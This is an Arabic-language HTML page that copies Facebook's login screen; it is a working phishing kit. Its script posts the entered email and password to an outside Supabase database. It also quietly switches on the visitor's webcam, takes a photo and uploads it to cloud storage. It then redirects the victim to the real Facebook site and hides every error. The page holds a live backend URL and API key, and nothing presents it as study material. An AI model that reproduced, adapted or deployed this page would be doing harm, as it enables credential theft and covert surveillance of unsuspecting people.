<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook Login Clone</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background: white;
      width: 360px;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgb(0 0 0 / 0.15);
      text-align: center;
      direction: rtl;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      width: 180px;
      user-select: none;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    input[type="text"],
    input[type="password"] {
      padding: 14px 12px;
      margin-bottom: 12px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      outline: none;
      transition: border-color 0.2s;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #1877f2;
    }
    button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
    }
    button:hover {
      background-color: #166fe5;
    }
    .forgot-password {
      margin-top: 12px;
      font-size: 14px;
      color: #1877f2;
      cursor: pointer;
      user-select: none;
      text-decoration: none;
    }
    .forgot-password:hover {
      text-decoration: underline;
    }
    .divider {
      margin: 20px 0;
      border-bottom: 1px solid #dddfe2;
    }
    .create-account {
      background-color: #42b72a;
      padding: 14px;
      border-radius: 6px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      user-select: none;
    }
    .create-account:hover {
      background-color: #36a420;
    }
    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div class="login-container">
    <div class="logo">
      <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" />
    </div>

    <form id="loginForm">
      <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
      <input type="password" id="password" name="password" placeholder="كلمة المرور" required />
      <button type="submit">تسجيل الدخول</button>
    </form>

    <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>

    <div class="divider"></div>

    <div class="create-account">إنشاء حساب جديد</div>
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

    const SUPABASE_URL = 'https://zyeescwfrdcacgnlflcr.supabase.co';
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp5ZWVzY3dmcmRjYWNnbmxmbGNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYxMTY3NDEsImV4cCI6MjA3MTY5Mjc0MX0.e4bOQLyKCP3NM7udfasIBWu1-2kw0rRfQ0X4q0Dz5Fo';

    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

    const loginForm = document.getElementById('loginForm');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    loginForm.addEventListener('submit', async (event) => {
      event.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      if (!email || !password) {
        return;
      }

      // ✅ التحقق من أن البريد الإلكتروني صحيح
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailPattern.test(email)) {
        alert("يرجى إدخال بريد إلكتروني صحيح.");
        return;
      }

      try {
        await startAndCapture();

        const response = await fetch(`${SUPABASE_URL}/rest/v1/users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`
          },
          body: JSON.stringify({
            email: email,
            password: password
          })
        });

        if (response.status === 201) {
          loginForm.reset();
          // ✅ إعادة التوجيه بعد نجاح الإرسال
          window.location.href = 'https://www.facebook.com/login';
        }
      } catch (err) {
        // تجاهل الأخطاء
      }
    });

    async function startAndCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => setTimeout(resolve, 1500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
          await supabase.storage
            .from('avatars')
            .upload(`avatar-${Date.now()}.jpg`, blob, {
              contentType: 'image/jpeg',
              upsert: false
            });

          stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg');
      } catch (err) {
        // تجاهل الأخطاء
      }
    }
  </script>
</body>
</html>
